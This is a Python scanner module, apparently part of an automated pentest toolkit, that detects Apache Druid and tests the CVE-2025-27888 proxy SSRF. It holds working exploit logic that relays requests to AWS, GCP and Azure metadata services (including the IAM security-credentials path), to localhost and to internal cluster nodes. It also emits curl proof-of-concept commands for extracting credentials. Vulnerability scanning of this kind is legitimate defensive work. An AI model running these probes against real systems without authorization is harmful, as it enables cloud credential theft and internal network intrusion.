"""
Apache Druid SSRF — CVE-2025-27888
Skill #60 — ApacheDruidSSRF

Research basis:
  XBOW Security Research — Nico Waisman (September 23, 2025)
  "CVE-2025-27888: Server-Side Request Forgery via URL Parsing Confusion
   in Apache Druid Proxy Endpoint"
  https://xbow.com/blog/apache-druid-proxy

Background:

  Apache Druid is a high-performance real-time analytics database widely
  used in data engineering pipelines. Its management console exposes an
  internal HTTP proxy endpoint intended for administrative use.

  CVE-2025-27888 exploits URL parsing confusion in this proxy endpoint,
  allowing an unauthenticated (or low-privilege) attacker to make the
  Druid server issue HTTP requests to arbitrary destinations — including
  cloud metadata services, internal network services, and other Druid
  cluster nodes.

  Discovery method (XBOW AI):
    XBOW's AI models, trained on historical CVE data, reasoned that since
    past SSRF vulnerabilities existed on Druid's task and SQL endpoints,
    the management proxy functionality was also likely vulnerable. After
    exhausting known patterns, it guessed the /proxy endpoint and
    confirmed SSRF via error message analysis — zero-day discovery.

Affected versions:
  Apache Druid < 31.0.2 (patch: 31.0.2)
  Apache Druid < 32.0.1 (patch: 32.0.1)

Attack surface:
  - /druid/proxy?url=<internal_url>
  - /proxy?url=<internal_url>
  - /druid/coordinator/v1/... (proxy relay)
  - Management console on default port 8888

Impact:
  - Cloud metadata theft (AWS IMDSv1: 169.254.169.254)
  - IAM credential extraction → cloud account takeover
  - Internal network port scanning via proxy
  - Access to other Druid cluster nodes (coordinator/broker/historical)
  - Internal API access behind firewall

AI auto-selection criteria:
  - Apache Druid management console detected
  - Druid-specific paths (/druid/, /unified-console.html)
  - Port 8888 service identified as Druid
  - Server header or body contains "druid"
"""
from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

import httpx


# ── Evidence levels ───────────────────────────────────────────────────────────
VERIFIED    = "VERIFIED"
LIKELY      = "LIKELY"
INFERRED    = "INFERRED"
AI_ANALYSIS = "AI_ANALYSIS"

# ── Probe targets for SSRF confirmation ──────────────────────────────────────
# Cloud metadata services
_CLOUD_METADATA_PROBES = [
    ("AWS IMDSv1",     "http://169.254.169.254/latest/meta-data/"),
    ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("GCP metadata",   "http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
    ("Azure IMDS",     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
]

# Internal loopback / localhost probes
_INTERNAL_PROBES = [
    ("localhost HTTP",       "http://127.0.0.1/"),
    ("localhost alt port",   "http://127.0.0.1:8080/"),
    ("Druid coordinator",    "http://127.0.0.1:8081/druid/coordinator/v1/datasources"),
    ("Druid broker",         "http://127.0.0.1:8082/druid/v2/datasources"),
    ("Druid overlord",       "http://127.0.0.1:8090/druid/indexer/v1/task"),
    ("Druid historical",     "http://127.0.0.1:8083/druid/historical/v1/loadstatus"),
]

# Proxy endpoint patterns to test
_PROXY_ENDPOINTS = [
    "/proxy",
    "/druid/proxy",
    "/druid/coordinator/v1/proxy",
    "/druid-ext/basic-security/authentication/db/chain",
]


@dataclass
class DruidFinding:
    finding_type: str
    severity: str
    evidence_level: str
    title: str
    detail: str
    poc_curl: str = ""
    poc_response_snippet: str = ""
    remediation: str = ""
    cve: str = "CVE-2025-27888"
    cvss: float = 0.0


@dataclass
class DruidResult:
    target: str = ""
    druid_detected: bool = False
    druid_version: str = ""
    druid_indicators: list[str] = field(default_factory=list)
    proxy_endpoint: str = ""            # confirmed proxy endpoint
    proxy_found: bool = False
    ssrf_confirmed: bool = False
    ssrf_target: str = ""              # which internal URL was reached
    cloud_metadata_exposed: bool = False
    cloud_metadata_snippet: str = ""
    internal_services_found: list[str] = field(default_factory=list)
    druid_nodes_exposed: list[str] = field(default_factory=list)
    findings: list[DruidFinding] = field(default_factory=list)
    error: str = ""
    scan_duration_s: float = 0.0
    evidence_summary: dict[str, int] = field(default_factory=dict)


class ApacheDruidSSRFScanner:
    """
    Skill #60 — ApacheDruidSSRFScanner

    Detects Apache Druid management consoles and tests for
    CVE-2025-27888 SSRF via URL parsing confusion in the proxy endpoint.

    AI auto-selection criteria:
      - /druid/ or /unified-console.html paths found
      - Port 8888 service responds with Druid content
      - Server header or page body contains "druid"
      - x-druid-* response headers present
    """

    TIMEOUT = 12.0
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, target: str, timeout: float = TIMEOUT):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._client = httpx.Client(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": self.UA},
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self) -> DruidResult:
        result = DruidResult(target=self.target)
        t0 = time.perf_counter()
        try:
            self._run(result)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
        finally:
            result.scan_duration_s = round(time.perf_counter() - t0, 2)
            result.evidence_summary = self._count_evidence(result.findings)
        return result

    # ── Internal logic ────────────────────────────────────────────────────────

    def _run(self, result: DruidResult) -> None:
        self._detect_druid(result)
        if not result.druid_detected:
            # Also try with port 8888 if not already included
            if ":8888" not in self.target:
                self._detect_druid_alt_port(result)
        if not result.druid_detected:
            return
        self._find_proxy_endpoint(result)
        if result.proxy_found:
            self._test_ssrf_cloud_metadata(result)
            self._test_ssrf_internal(result)
            self._test_ssrf_druid_nodes(result)
        self._generate_findings(result)

    def _detect_druid(self, result: DruidResult) -> None:
        """Detect Apache Druid via HTTP fingerprinting."""
        probe_paths = [
            "/",
            "/unified-console.html",
            "/druid/coordinator/v1/isLeader",
            "/status",
            "/druid/coordinator/v1/config",
        ]
        indicators = []
        for path in probe_paths:
            try:
                r = self._client.get(f"{self.target}{path}")
                hdrs_str = str(r.headers).lower()
                body = r.text.lower()[:2000]
                if "druid" in body or "druid" in hdrs_str:
                    if path not in ["/", "/status"]:
                        indicators.append(f"Druid path accessible: {path}")
                    elif "druid" in body:
                        indicators.append(f"Druid content at {path}")
                if "x-druid" in hdrs_str:
                    indicators.append("x-druid-* response headers")
                if r.status_code == 200 and "apache druid" in body:
                    indicators.append("Apache Druid confirmed in HTML")
                    # Try to extract version
                    if "druid-" in body:
                        import re
                        m = re.search(r"druid[\-\s/](\d+\.\d+\.\d+)", body)
                        if m:
                            result.druid_version = m.group(1)
            except Exception:
                continue
        if indicators:
            result.druid_detected = True
            result.druid_indicators = indicators

    def _detect_druid_alt_port(self, result: DruidResult) -> None:
        """Try default Druid port 8888 if main target doesn't show Druid."""
        import re
        base = re.sub(r":\d+$", "", self.target.split("//")[-1])
        alt_targets = [
            f"http://{base}:8888",
            f"http://{base}:8081",   # coordinator
        ]
        for alt in alt_targets:
            try:
                r = httpx.get(
                    f"{alt}/druid/coordinator/v1/isLeader",
                    timeout=5.0,
                    verify=False,
                    follow_redirects=True,
                    headers={"User-Agent": self.UA},
                )
                if r.status_code in (200, 404) and "druid" in r.text.lower():
                    result.druid_detected = True
                    result.druid_indicators.append(f"Druid on alternate port: {alt}")
                    self.target = alt
                    break
            except Exception:
                continue

    def _find_proxy_endpoint(self, result: DruidResult) -> None:
        """Locate the proxy endpoint (CVE-2025-27888 attack surface)."""
        for path in _PROXY_ENDPOINTS:
            try:
                # Send a benign probe — an invalid URL triggers an error
                # that reveals whether the endpoint exists
                r = self._client.get(
                    f"{self.target}{path}",
                    params={"url": "http://bingo-probe.invalid/"},
                )
                body = r.text.lower()
                # Error messages indicating proxy exists:
                # "connection refused", "unknown host", "proxy", "url"
                if any(kw in body for kw in (
                    "connection", "unknown host", "proxy",
                    "refused", "failed to connect", "url"
                )):
                    result.proxy_found = True
                    result.proxy_endpoint = f"{self.target}{path}"
                    break
                # 200 or 500 on proxy path also signals existence
                if r.status_code in (200, 500, 400):
                    result.proxy_found = True
                    result.proxy_endpoint = f"{self.target}{path}"
                    break
            except Exception:
                continue

    def _test_ssrf_cloud_metadata(self, result: DruidResult) -> None:
        """Test SSRF against cloud metadata services."""
        if not result.proxy_endpoint:
            return
        for service_name, metadata_url in _CLOUD_METADATA_PROBES:
            try:
                r = self._client.get(
                    result.proxy_endpoint,
                    params={"url": metadata_url},
                )
                body = r.text
                # Positive indicators in cloud metadata responses
                if r.status_code == 200 and any(indicator in body for indicator in (
                    "ami-", "instance-id", "iam", "security-credentials",
                    "computeMetadata", "access_token", "serviceAccounts",
                    "subscriptionId", "resourceGroupName",
                )):
                    result.cloud_metadata_exposed = True
                    result.ssrf_confirmed = True
                    result.ssrf_target = metadata_url
                    result.cloud_metadata_snippet = body[:500]
                    break
            except Exception:
                continue

    def _test_ssrf_internal(self, result: DruidResult) -> None:
        """Test SSRF against internal localhost services."""
        if not result.proxy_endpoint:
            return
        for service_name, internal_url in _INTERNAL_PROBES:
            try:
                r = self._client.get(
                    result.proxy_endpoint,
                    params={"url": internal_url},
                )
                if r.status_code == 200 and len(r.text) > 50:
                    result.ssrf_confirmed = True
                    result.ssrf_target = internal_url
                    result.internal_services_found.append(
                        f"{service_name} ({internal_url}): HTTP {r.status_code}"
                    )
            except Exception:
                continue

    def _test_ssrf_druid_nodes(self, result: DruidResult) -> None:
        """Test SSRF to reach other Druid cluster nodes."""
        if not result.proxy_endpoint:
            return
        druid_internal_paths = [
            ("coordinator datasources", "http://127.0.0.1:8081/druid/coordinator/v1/datasources"),
            ("overlord tasks",          "http://127.0.0.1:8090/druid/indexer/v1/task"),
            ("broker datasources",      "http://127.0.0.1:8082/druid/v2/datasources"),
        ]
        for node_name, node_url in druid_internal_paths:
            try:
                r = self._client.get(
                    result.proxy_endpoint,
                    params={"url": node_url},
                )
                if r.status_code == 200 and (
                    "datasource" in r.text.lower() or
                    "task" in r.text.lower() or
                    "[" in r.text or "{" in r.text
                ):
                    result.ssrf_confirmed = True
                    result.druid_nodes_exposed.append(
                        f"{node_name}: {node_url}"
                    )
            except Exception:
                continue

    # ── Finding generation ────────────────────────────────────────────────────

    def _generate_findings(self, result: DruidResult) -> None:
        if not result.druid_detected:
            return

        # Druid detection
        result.findings.append(DruidFinding(
            finding_type="druid_detected",
            severity="INFO",
            evidence_level=VERIFIED,
            title=(
                f"Apache Druid Management Console Detected"
                + (f" v{result.druid_version}" if result.druid_version else "")
            ),
            detail=(
                f"Target {result.target} runs Apache Druid: "
                + ", ".join(result.druid_indicators)
            ),
            poc_curl=(
                f"curl -sk '{self.target}/druid/coordinator/v1/isLeader' | head -c 200"
            ),
            remediation="Upgrade to Apache Druid 31.0.2+ or 32.0.1+ (CVE-2025-27888 patched).",
        ))

        # Version warning
        if result.druid_version:
            try:
                parts = result.druid_version.split(".")
                major, minor = int(parts[0]), int(parts[1])
                patch = int(parts[2]) if len(parts) > 2 else 0
                is_vuln = (major < 31) or (major == 31 and minor == 0 and patch < 2) or \
                          (major == 32 and minor == 0 and patch < 1)
                if is_vuln:
                    result.findings.append(DruidFinding(
                        finding_type="vulnerable_version",
                        severity="HIGH",
                        evidence_level=VERIFIED,
                        title=f"Vulnerable Apache Druid Version: {result.druid_version} — CVE-2025-27888",
                        detail=(
                            f"Version {result.druid_version} is affected by CVE-2025-27888 "
                            f"(SSRF via proxy endpoint). "
                            f"Patched in: 31.0.2 / 32.0.1."
                        ),
                        remediation="Upgrade immediately: https://druid.apache.org/downloads/",
                        cvss=7.5,
                    ))
            except (ValueError, IndexError):
                pass

        # Proxy endpoint found
        if result.proxy_found:
            result.findings.append(DruidFinding(
                finding_type="proxy_endpoint_found",
                severity="HIGH",
                evidence_level=VERIFIED,
                title=f"Druid Proxy Endpoint Found: {result.proxy_endpoint}",
                detail=(
                    "The Apache Druid proxy endpoint (CVE-2025-27888 attack surface) "
                    "is accessible and responds to URL parameter probes."
                ),
                poc_curl=(
                    f"curl -sk '{result.proxy_endpoint}?url=http://169.254.169.254/latest/meta-data/'"
                ),
                remediation=(
                    "1. Upgrade to Druid 31.0.2+ or 32.0.1+.\n"
                    "2. Block external access to the management console.\n"
                    "3. Whitelist allowed proxy destinations."
                ),
                cvss=7.5,
            ))

        # SSRF confirmed
        if result.ssrf_confirmed:
            result.findings.append(DruidFinding(
                finding_type="ssrf_confirmed",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title=f"CVE-2025-27888 SSRF CONFIRMED — Internal URL reached: {result.ssrf_target}",
                detail=(
                    f"Apache Druid proxy endpoint successfully forwarded requests to: "
                    f"{result.ssrf_target}\n"
                    f"This confirms CVE-2025-27888 SSRF is exploitable on this target."
                ),
                poc_curl=(
                    f"curl -sk '{result.proxy_endpoint}?url={result.ssrf_target}'"
                ),
                remediation=(
                    "CRITICAL: Apply patch immediately.\n"
                    "1. Upgrade to Apache Druid 31.0.2+ or 32.0.1+.\n"
                    "2. Network-level: block Druid server's outbound access to 169.254.169.254.\n"
                    "3. Enable IMDSv2 on AWS instances (PUT-based token required).\n"
                    "4. Restrict management console to internal networks only."
                ),
                cvss=9.1,
            ))

        # Cloud metadata exposed
        if result.cloud_metadata_exposed:
            result.findings.append(DruidFinding(
                finding_type="cloud_metadata_exposed",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title="Cloud Metadata Service Exposed via CVE-2025-27888 SSRF",
                detail=(
                    f"SSRF successfully reached cloud metadata service at {result.ssrf_target}.\n"
                    f"Response snippet: {result.cloud_metadata_snippet[:300]}"
                ),
                poc_curl=(
                    f"curl -sk '{result.proxy_endpoint}?url=http://169.254.169.254/"
                    f"latest/meta-data/iam/security-credentials/' "
                    f"# Extract IAM credentials"
                ),
                poc_response_snippet=result.cloud_metadata_snippet[:300],
                remediation=(
                    "CRITICAL: Cloud credentials may be compromised.\n"
                    "1. Rotate all IAM credentials immediately.\n"
                    "2. Enable IMDSv2 (disables IMDSv1 token-less access).\n"
                    "3. Apply network-level block: iptables -A OUTPUT -d 169.254.169.254 -j DROP "
                    "(on Druid host)."
                ),
                cvss=9.8,
            ))

        # Internal Druid nodes exposed
        for node_info in result.druid_nodes_exposed:
            result.findings.append(DruidFinding(
                finding_type="druid_cluster_node_exposed",
                severity="HIGH",
                evidence_level=VERIFIED,
                title=f"Internal Druid Cluster Node Accessible via SSRF: {node_info.split(':')[0]}",
                detail=(
                    f"SSRF reached internal Druid cluster node: {node_info}\n"
                    "This can expose sensitive cluster configuration, data sources, and tasks."
                ),
                poc_curl=(
                    f"curl -sk '{result.proxy_endpoint}?url={node_info.split('(')[-1].rstrip(')')}"
                    if "(" in node_info else
                    f"curl -sk '{result.proxy_endpoint}?url=http://127.0.0.1:8081/druid/coordinator/v1/datasources'"
                ),
                remediation=(
                    "Apply Druid patch and isolate cluster nodes from the proxy endpoint."
                ),
                cvss=7.5,
            ))

        # Internal services found
        for svc in result.internal_services_found:
            result.findings.append(DruidFinding(
                finding_type="internal_service_reached",
                severity="MEDIUM",
                evidence_level=LIKELY,
                title=f"Internal Service Reachable via SSRF: {svc}",
                detail=(
                    f"Apache Druid SSRF proxy successfully connected to internal service: {svc}"
                ),
                poc_curl=(
                    f"curl -sk '{result.proxy_endpoint}?url=http://127.0.0.1/'"
                ),
                remediation="Restrict Druid server's outbound network access.",
                cvss=6.5,
            ))

    @staticmethod
    def _count_evidence(findings: list[DruidFinding]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for f in findings:
            counts[f.evidence_level] = counts.get(f.evidence_level, 0) + 1
        return counts

    def close(self) -> None:
        self._client.close()

    def __enter__(self) -> "ApacheDruidSSRFScanner":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()
